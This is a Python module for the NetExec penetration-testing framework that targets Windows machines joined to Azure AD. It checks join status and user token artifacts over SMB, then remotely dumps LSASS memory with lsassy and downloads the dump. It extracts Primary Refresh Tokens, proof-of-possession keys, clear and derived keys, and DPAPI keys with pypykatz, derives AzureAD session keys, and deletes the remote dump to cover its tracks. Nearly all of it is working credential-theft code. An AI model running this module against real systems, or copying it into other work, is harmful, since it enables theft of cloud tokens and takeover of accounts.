from __future__ import annotations

import binascii
import os
import re
import struct
import hmac
import hashlib
import subprocess
from typing import Optional, Tuple, List
import json

try:
    from nxc.helpers.misc import CATEGORY
except Exception:
    # Fallback for older packaged builds
    from enum import Enum

    class CATEGORY(Enum):
        ENUMERATION = "Enumeration"
        CREDENTIAL_DUMPING = "Credential Dumping"
        PRIVILEGE_ESCALATION = "Privilege Escalation"

try:
    from nxc.paths import NXC_PATH
    _DEFAULT_SAVE_DIR = os.path.join(NXC_PATH, "modules", "cloudap")
except Exception:
    _DEFAULT_SAVE_DIR = os.path.join(os.path.expanduser("~"), ".nxc", "modules", "cloudap")


class NXCModule:
    r"""
    CloudAP PRT discovery/dump/derivation over SMB.

    - ACTION: Operation to perform: check | dump | derive (default: check)
    - METHOD: lsassy dump method (default: comsvcs)
    - SAVE_DIR: Local directory to save LSASS dump (default: ~/.nxc/modules/cloudap)
    - VERBOSE: Extra diagnostics
    - DERIVE_SECRET: 32-byte hex secret for ACTION=derive
    - DERIVE_CONTEXT: 24-byte hex context for ACTION=derive
    - PARSE: When dumping, automatically parse and print 'cloudap :' sections (default: true)
    - DUMP_FILE: For ACTION=parse, path to a local LSASS dump to parse

    Examples:
      nxc smb <target> -u <user> -p <pass> -M cloudap -o ACTION=check
      nxc smb <target> -u <user> -p <pass> -M cloudap -o ACTION=dump METHOD=comsvcs SAVE_DIR=/tmp
      nxc smb <target> -u <user> -p <pass> -M cloudap -o ACTION=derive DERIVE_SECRET=<64-hex> DERIVE_CONTEXT=<48-hex>
    """

    name = "cloudap"
    description = "Check AzureAD join status and user artifacts via SMB, dump LSASS via lsassy (no uploads), derive key, or parse dumps for cloudap"
    supported_protocols = ["smb"]
    opsec_safe = True
    multiple_hosts = False
    category = CATEGORY.CREDENTIAL_DUMPING

    def __init__(self):
        self.action = "check"
        self.method = "comsvcs"
        self.save_dir = _DEFAULT_SAVE_DIR
        self.verbose = False
        self.derive_secret_hex: Optional[str] = None
        self.derive_context_hex: Optional[str] = None
        self.auto_parse = True
        self.dump_file: Optional[str] = None

    def options(self, context, module_options):
        """
        ACTION              Operation to perform: check | dump | derive (default: check)
        METHOD              lsassy dump method (default: comsvcs)
        SAVE_DIR            Local directory to save LSASS dump (default: ~/.nxc/modules/cloudap)
        VERBOSE             Extra diagnostics (default: false)
        DERIVE_SECRET       32-byte hex secret for ACTION=derive
        DERIVE_CONTEXT      24-byte hex context for ACTION=derive
        PARSE               When dumping, automatically parse and print 'cloudap :' sections (default: true)
        DUMP_FILE           For ACTION=parse, path to a local LSASS dump to parse
        """
        # defaults
        self.action = "check"
        self.method = "comsvcs"
        self.save_dir = _DEFAULT_SAVE_DIR
        self.verbose = False
        self.derive_secret_hex = None
        self.derive_context_hex = None
        self.auto_parse = True
        self.dump_file = None

        if not module_options:
            return

        for k, v in module_options.items():
            kl = k.lower()
            if kl == "action":
                self.action = str(v).lower()
            elif kl == "method":
                self.method = str(v)
            elif kl == "save_dir":
                self.save_dir = str(v)
            elif kl == "verbose":
                self.verbose = str(v).lower() in ["1", "true", "yes"]
            elif kl == "derive_secret":
                self.derive_secret_hex = str(v)
            elif kl == "derive_context":
                self.derive_context_hex = str(v)
            elif kl == "parse":
                self.auto_parse = str(v).lower() in ["1", "true", "yes"]
            elif kl == "dump_file":
                self.dump_file = str(v)

    # -- Execution entry points -------------------------------------------------
    def on_login(self, context, connection):
        # Non-admin "check" can run under normal user
        if self.action == "check":
            # Avoid duplicate execution if both on_login and on_admin_login are triggered
            if getattr(connection, "__cloudap_check_done__", False):
                return
            try:
                setattr(connection, "__cloudap_check_done__", True)
            except Exception:
                pass
            self._do_check(context, connection)
        elif self.action == "derive":
            self._do_derive(context)
        elif self.action == "parse":
            self._do_parse_local(context)
        elif self.action == "dump":
            # Do nothing here; actual dump runs in on_admin_login only to avoid duplicate/misleading logs
            return
        else:
            context.log.fail(f"Unknown ACTION '{self.action}'")

    def on_admin_login(self, context, connection):
        if self.action == "check":
            # Avoid duplicate execution if both on_login and on_admin_login are triggered
            if getattr(connection, "__cloudap_check_done__", False):
                return
            try:
                setattr(connection, "__cloudap_check_done__", True)
            except Exception:
                pass
            self._do_check(context, connection)
        elif self.action == "dump":
            self._do_dump(context, connection)
        elif self.action == "derive":
            self._do_derive(context)
        elif self.action == "parse":
            self._do_parse_local(context)
        else:
            context.log.fail(f"Unknown ACTION '{self.action}'")

    # -- ACTION=check -----------------------------------------------------------
    def _do_check(self, context, connection):
        # Step 1: Assume C: drive (most common, avoids remote execution)
        system_drive = "C:"
        
        # Step 2: Check device-level join status via registry instead of dsregcmd
        # This avoids remote command execution and WMIEXEC errors
        try:
            # Check for Azure AD join via registry key existence
            # HKLM\SYSTEM\CurrentControlSet\Control\CloudDomainJoin\JoinInfo contains TenantId if joined
            joined = self._check_azuread_join_via_smb(connection)
            
            if self.verbose:
                context.log.debug(f"Device level - AzureAdJoined={joined}")
            
            if not joined:
                context.log.display("Device is not AzureAdJoined")
                return
            else:
                context.log.success(f"Device is AzureAdJoined")
        except Exception as e:
            if self.verbose:
                context.log.debug(f"Failed to check Azure AD join: {e}")
            context.log.fail(f"Failed to check Azure AD join status")
            return
        
        # Step 3: Scan user profiles for AAD artifacts
        context.log.display("Scanning user profiles for AzureAD authentication artifacts...")
        users_with_artifacts = self._scan_user_artifacts(context, connection, system_drive)
        
        if not users_with_artifacts:
            context.log.display("No users found with AzureAD artifacts (TokenBroker/CloudAP/NGC)")
            return
        
        context.log.success(f"Found {len(users_with_artifacts)} user(s) with AzureAD artifacts:")
        for username, artifacts in users_with_artifacts:
            context.log.highlight(f"  • {username}: {', '.join(artifacts)}")

    def _check_azuread_join_via_smb(self, connection) -> bool:
        """Check if device is Azure AD joined by looking for user artifacts via SMB."""
        try:
            # Try to access C$\Users directory - if it exists we can scan for artifacts
            # A simpler approach: just check if TokenBroker/NGC paths exist for any user
            # This is a heuristic but avoids remote command execution entirely
            share = "C$"
            try:
                connection.conn.listPath(share, "Users\\")
                # If we can list users, assume we can check for Azure AD artifacts
                return True
            except Exception:
                return False
        except Exception:
            return False

    def _scan_user_artifacts(self, context, connection, system_drive: str) -> list:
        """Scan user profiles for AzureAD artifact paths. Returns list of (username, [artifacts])."""
        users_with_artifacts = []
        
        # Simple approach: Just check common user profile locations via SMB
        # Instead of enumerating users, try the most common patterns
        share = "C$"
        
        # Get potential usernames by checking Users directory via SMB
        try:
            files = connection.conn.listPath(share, "Users\\*")
            
            usernames = []
            for f in files:
                name = f.get_longname()
                # Skip special entries and common system folders
                if name in ['.', '..', 'Public', 'Default', 'Default User', 'All Users', 'desktop.ini']:
                    continue
                if name.startswith('.'):
                    continue
                # Only add if it looks like it could be a user directory
                # Simple heuristic: not a common Windows system folder
                if name not in ['ProgramData', 'Program Files', 'Program Files (x86)', 'Windows']:
                    usernames.append(name)
            
            if self.verbose:
                context.log.debug(f"Found {len(usernames)} user profile(s): {', '.join(usernames)}")
            
            # Artifact paths to check (relative to user profile)
            # Only check most reliable paths to avoid timeouts
            artifact_checks = {
                'TokenBroker': 'AppData\\Local\\Microsoft\\TokenBroker\\Cache',
                'NGC': 'AppData\\Local\\Microsoft\\Ngc',
            }
            
            for username in usernames:
                artifacts_found = []
                
                for artifact_name, rel_path in artifact_checks.items():
                    try:
                        # Use direct SMB file operations instead of remote commands to avoid ATEXEC errors
                        # Try to list the directory via SMB (silent operation)
                        try:
                            # Attempt to access via connection.conn.listPath on C$ share
                            share = "C$"
                            path_to_check = f"Users\\{username}\\{rel_path}"
                            connection.conn.listPath(share, path_to_check)
                            # If no exception, path exists
                            artifacts_found.append(artifact_name)
                            if self.verbose:
                                context.log.debug(f"Found {artifact_name} for {username}")
                        except Exception:
                            # Path doesn't exist or can't access - silently skip
                            pass
                            
                    except Exception as e:
                        # Silently skip artifacts that can't be checked
                        if self.verbose:
                            context.log.debug(f"Could not check {artifact_name} for {username}: {e}")
                        continue
                
                if artifacts_found:
                    users_with_artifacts.append((username, artifacts_found))
            
        except Exception as e:
            if self.verbose:
                context.log.debug(f"Error scanning user artifacts: {e}")
        
        return users_with_artifacts
    
    @staticmethod
    def _parse_dsregcmd(output: str) -> Tuple[Optional[bool], Optional[bool]]:
        """Parse dsregcmd /status text for AzureAdJoined and AzureAdPrt booleans."""
        def find_bool(key: str) -> Optional[bool]:
            m = re.search(rf"{re.escape(key)}\s*:\s*(yes|no)", output, flags=re.I)
            if not m:
                return None
            return m.group(1).strip().lower() == "yes"

        joined = find_bool("AzureAdJoined")
        prt = find_bool("AzureAdPrt")
        return joined, prt

    # -- ACTION=dump ------------------------------------------------------------
    def _do_dump(self, context, connection):
        """Dump LSASS remotely via lsassy and download the dump locally (no binary upload)."""
        # Defer lsassy imports to avoid hard dependency for ACTION=check/derive/parse
        try:
            from lsassy.dumper import Dumper
            from lsassy.session import Session
            from lsassy.impacketfile import ImpacketFile
        except Exception as e:
            context.log.fail(f"lsassy is required for ACTION=dump: {e}")
            return

        host = connection.host
        domain_name = connection.domain
        username = connection.username
        password = getattr(connection, "password", "")
        lmhash = getattr(connection, "lmhash", "")
        nthash = getattr(connection, "nthash", "")

        # Prepare local save dir
        try:
            os.makedirs(self.save_dir, exist_ok=True)
        except Exception as e:
            context.log.fail(f"Error creating SAVE_DIR '{self.save_dir}': {e}")
            return

        session = Session()
        session.get_session(
            address=host,
            target_ip=host,
            port=445,
            lmhash=lmhash,
            nthash=nthash,
            username=username,
            password=password,
            domain=domain_name,
        )

        if session.smb_session is None:
            context.log.fail("Couldn't connect to remote host for lsassy session")
            return

        dumper = Dumper(session, timeout=10, time_between_commands=7).load(self.method)
        if dumper is None:
            context.log.fail(f"Unable to load lsassy dump method '{self.method}'")
            return

        file = dumper.dump()
        if file is None:
            context.log.fail("Unable to dump lsass via lsassy")
            return

        # Retrieve remote file path and download
        remote_path = None
        try:
            remote_path = file.get_file_path()
            share, rel = self._win_path_to_share(remote_path)
            if share is None:
                context.log.fail(f"Unexpected remote dump path: {remote_path}")
                file.close()
                return
            local_filename = os.path.join(self.save_dir, f"{host}_lsass.dmp")
            with open(local_filename, "wb") as f_out:
                connection.conn.getFile(share, rel, f_out.write)
            context.log.highlight(f"Saved LSASS dump to {local_filename}")
            if self.auto_parse:
                # Use pypykatz library API for both Python and frozen exe (unified approach)
                cloudap_sections = []
                try:
                    import sys
                    
                    # UNIFIED APPROACH: Use library API for both Python and frozen exe
                    if self.verbose:
                        env_type = "Frozen exe" if getattr(sys, 'frozen', False) else "Python"
                        context.log.debug(f"{env_type} detected, using pypykatz library API")
                    
                    try:
                        from pypykatz.pypykatz import pypykatz
                        
                        # Parse minidump and get structured object
                        mimi = pypykatz.parse_minidump_file(local_filename)
                        
                        # Extract cloudap credentials from pypykatz object model
                        if mimi and hasattr(mimi, 'logon_sessions'):
                            if self.verbose:
                                context.log.debug(f"pypykatz returned {len(mimi.logon_sessions)} logon sessions")
                            
                            for luid, session in mimi.logon_sessions.items():
                                if self.verbose:
                                    session_attrs = [attr for attr in dir(session) if not attr.startswith('_')]
                                    context.log.debug(f"Session {luid} attributes: {session_attrs[:20]}")
                                
                                # Try different attribute names for cloudap data
                                cloudap_data = None
                                if hasattr(session, 'cloudap_creds'):
                                    cloudap_data = session.cloudap_creds
                                elif hasattr(session, 'cloudap_data'):
                                    cloudap_data = session.cloudap_data
                                elif hasattr(session, 'cloudap'):
                                    cloudap_data = session.cloudap
                                
                                if not cloudap_data:
                                    continue
                                
                                if self.verbose:
                                    context.log.debug(f"Found cloudap data in session {luid}, type: {type(cloudap_data)}, len: {len(cloudap_data) if hasattr(cloudap_data, '__len__') else 'N/A'}")
                                
                                # Process each cloudap entry
                                cloudap_list = cloudap_data if isinstance(cloudap_data, list) else [cloudap_data]
                                for cloudap_cred in cloudap_list:
                                    section_dict = {}
                                    
                                    # Extract all available fields from cloudap object
                                    if hasattr(cloudap_cred, 'key_guid') and cloudap_cred.key_guid:
                                        section_dict['KeyGuid'] = str(cloudap_cred.key_guid)
                                    if hasattr(cloudap_cred, 'cachedir') and cloudap_cred.cachedir:
                                        section_dict['CacheDir'] = str(cloudap_cred.cachedir)
                                    if hasattr(cloudap_cred, 'PRT') and cloudap_cred.PRT:
                                        section_dict['PRT'] = str(cloudap_cred.PRT)
                                    if hasattr(cloudap_cred, 'ProofOfPossesionKey') and cloudap_cred.ProofOfPossesionKey:
                                        section_dict['ProofOfPossesionKey'] = cloudap_cred.ProofOfPossesionKey.hex()
                                    if hasattr(cloudap_cred, 'ClearKey') and cloudap_cred.ClearKey:
                                        section_dict['ClearKey'] = cloudap_cred.ClearKey.hex()
                                    if hasattr(cloudap_cred, 'DerivedKey') and cloudap_cred.DerivedKey:
                                        section_dict['DerivedKey'] = cloudap_cred.DerivedKey.hex()
                                    if hasattr(cloudap_cred, 'Context') and cloudap_cred.Context:
                                        section_dict['Context'] = cloudap_cred.Context.hex()
                                    if hasattr(cloudap_cred, 'dpapi_key') and cloudap_cred.dpapi_key:
                                        section_dict['DPAPI_Key'] = cloudap_cred.dpapi_key.hex()
                                    
                                    # Add any other string attributes
                                    for attr in dir(cloudap_cred):
                                        if not attr.startswith('_') and attr not in ['key_guid', 'cachedir', 'PRT', 
                                            'ProofOfPossesionKey', 'ClearKey', 'DerivedKey', 'Context', 'dpapi_key']:
                                            val = getattr(cloudap_cred, attr, None)
                                            if val and isinstance(val, (str, int, bytes)):
                                                if isinstance(val, bytes):
                                                    section_dict[attr] = val.hex()
                                                else:
                                                    section_dict[attr] = str(val)
                                    
                                    if section_dict:
                                        cloudap_sections.append(section_dict)
                            
                            if self.verbose:
                                context.log.debug(f"pypykatz library API found {len(cloudap_sections)} cloudap entries")
                    except Exception as lib_err:
                        if self.verbose:
                            context.log.debug(f"pypykatz library parse failed: {lib_err}")
                    
                    # Display found sections
                    for idx, section_dict in enumerate(cloudap_sections, 1):
                        lines = ["        cloudap :"]
                        # Display ALL fields from the section
                        for field_name, field_value in section_dict.items():
                            lines.append(f"             {field_name} : {field_value}")
                        context.log.highlight(f"cloudap section #{idx} (pypykatz):")
                        context.log.display("\n".join(lines))
                    
                    if self.verbose:
                        context.log.debug(f"pypykatz parse: cloudap creds found={len(cloudap_sections)}")
                                    
                except Exception as e:
                    if self.verbose:
                        context.log.debug(f"pypykatz local parse failed: {e}")
        except Exception as e:
            context.log.fail(f"Error downloading LSASS dump: {e}")
        finally:
            # Cleanup remote file BEFORE closing the file handle
            if remote_path:
                try:
                    deleted_file = ImpacketFile.delete(session, remote_path)
                    if deleted_file:
                        if self.verbose:
                            context.log.debug(f"Deleted remote lsassy dump file: {remote_path}")
                    else:
                        # lsassy might auto-cleanup or file already deleted
                        if self.verbose:
                            context.log.debug(f"Remote dump file already cleaned up or delete returned false: {remote_path}")
                except Exception as e:
                    context.log.fail(f"[OPSEC] Error deleting remote dump {remote_path}: {e}")
            
            # Close file handle after cleanup
            try:
                file.close()
            except Exception:
                pass

    @staticmethod
    def _win_path_to_share(path: str) -> Tuple[Optional[str], Optional[str]]:
        # Normalize slashes
        p = path.replace('/', '\\') if path else ''
        if not p:
            return None, None
        # Case 1: Drive-qualified path, e.g., C:\Windows\Temp\file.dmp
        if len(p) >= 3 and p[1] == ':' and p[2] == '\\':
            share = p[0].upper() + '$'
            rel = p[2:]
            if not rel.startswith('\\'):
                rel = '\\' + rel
            return share, rel
        # Case 2: Rooted path without drive, e.g., \Windows\Temp\file.dmp -> assume C$
        if p.startswith('\\') and ':' not in p:
            return 'C$', p
        # Unknown format
        return None, None

    # -- ACTION=derive ----------------------------------------------------------
    def _do_derive(self, context):
        if not self.derive_secret_hex or not self.derive_context_hex:
            context.log.fail("DERIVE_SECRET and DERIVE_CONTEXT are required for ACTION=derive")
            return
        try:
            secret = self._parse_hex(self.derive_secret_hex, 32)
            context_bytes = self._parse_hex(self.derive_context_hex, 24)
        except ValueError as e:
            context.log.fail(str(e))
            return

        dk = self._sp800108_ctr_hmac_sha256(secret, b"AzureAD-SecureConversation", context_bytes, 32)
        context.log.success("Derived key (hex):")
        context.log.highlight(binascii.hexlify(dk).decode().upper())

    @staticmethod
    def _parse_hex(h: str, expected_len: int) -> bytes:
        h2 = h.strip().replace(" ", "")
        if len(h2) != expected_len * 2 or not re.fullmatch(r"[0-9a-fA-F]+", h2):
            raise ValueError(f"Expected {expected_len} bytes hex ({expected_len*2} chars)")
        return binascii.unhexlify(h2)

    @staticmethod
    def _sp800108_ctr_hmac_sha256(key: bytes, label: bytes, context_bytes: bytes, out_len: int) -> bytes:
        # SP800-108 KDF in counter mode with HMAC-SHA256.
        # K(1) = HMAC(key, [i]_32 || Label || 0x00 || Context || [L]_32), i=1, L=out_bits
        result = b""
        i = 1
        out_bits = out_len * 8
        while len(result) < out_len:
            msg = struct.pack(">I", i) + label + b"\x00" + context_bytes + struct.pack(">I", out_bits)
            block = hmac.new(key, msg, hashlib.sha256).digest()
            result += block
            i += 1
        return result[:out_len]

    # -- ACTION=parse (local) ---------------------------------------------------
    def _do_parse_local(self, context):
        if not self.dump_file:
            context.log.fail("DUMP_FILE is required for ACTION=parse")
            return
        if not os.path.exists(self.dump_file):
            context.log.fail(f"DUMP_FILE not found: {self.dump_file}")
            return
        # Structured local parse via pypykatz CLI (API doesn't populate packages)
        try:
            import sys
            # Call pypykatz CLI
            result = subprocess.run(
                [sys.executable, '-m', 'pypykatz', 'lsa', 'minidump', self.dump_file],
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr
            if not output.strip():
                context.log.display("pypykatz CLI returned no output")
            else:
                # Parse cloudap sections from CLI output
                cloudap_sections = self._parse_pypykatz_output(output)
                if not cloudap_sections:
                    context.log.display("No CloudAP sections found in dump")
                else:
                    for idx, section_dict in enumerate(cloudap_sections, 1):
                        lines = ["        cloudap :"]
                        # Display ALL fields from the section
                        for field_name, field_value in section_dict.items():
                            lines.append(f"             {field_name} : {field_value}")
                        context.log.highlight(f"cloudap section #{idx} (pypykatz):")
                        context.log.display("\n".join(lines))
        except Exception as e:
            context.log.fail(f"pypykatz parse failed: {e}")

    # -- Parse pypykatz CLI output -------------------------------------------
    def _parse_pypykatz_output(self, output: str) -> List[dict]:
        """Parse CloudAP sections from pypykatz CLI text output - capture ALL fields."""
        sections = []
        lines = output.split('\n')
        in_cloudap = False
        current_section = {}
        current_field = None
        
        for line in lines:
            stripped = line.strip()
            
            # Detect CloudAP section start
            if '== Cloudap' in line or '== cloudap' in line:
                if current_section:  # save previous section
                    sections.append(current_section)
                current_section = {}
                in_cloudap = True
                current_field = None
                continue
            
            # Detect section end (next credential type or LogonSession)
            if in_cloudap and ('==' in stripped or 'LogonSession' in line):
                if 'Cloudap' not in line and 'cloudap' not in line:
                    if current_section:
                        sections.append(current_section)
                    current_section = {}
                    in_cloudap = False
                    current_field = None
                    continue
            
            if in_cloudap and stripped:
                # Check if this is a field name line (contains at least one space followed by value)
                # Field names in pypykatz output are indented and followed by value
                if ' ' in stripped:
                    parts = stripped.split(None, 1)
                    if len(parts) == 2:
                        field_name = parts[0]
                        field_value = parts[1]
                        # Store as-is
                        current_section[field_name] = field_value
                        current_field = field_name
                    elif len(parts) == 1 and current_field:
                        # Continuation of previous field (multi-line value)
                        current_section[current_field] += ' ' + parts[0]
        
        # Save last section if still in cloudap
        if current_section:
            sections.append(current_section)
        
        return sections
